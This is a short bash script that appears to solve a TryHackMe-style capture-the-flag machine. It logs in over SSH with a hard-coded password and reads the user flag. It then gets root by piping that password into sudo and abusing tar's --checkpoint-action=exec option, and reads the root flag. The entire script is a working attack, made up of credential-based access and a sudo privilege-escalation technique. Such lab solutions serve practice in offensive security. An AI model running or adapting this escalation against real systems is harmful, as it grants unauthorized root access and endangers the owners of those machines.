#!/bin/bash
IP=$1

if [[ -z $IP ]]; then
	echo "Usage: $0 <IP>"
	exit 1
fi

sshpass -p RedDr4gonSynd1cat3 ssh lin@$IP "cat ~/Desktop/user.txt; echo 'RedDr4gonSynd1cat3' | sudo -S tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/cat /root/root.txt'" | grep THM --color=auto
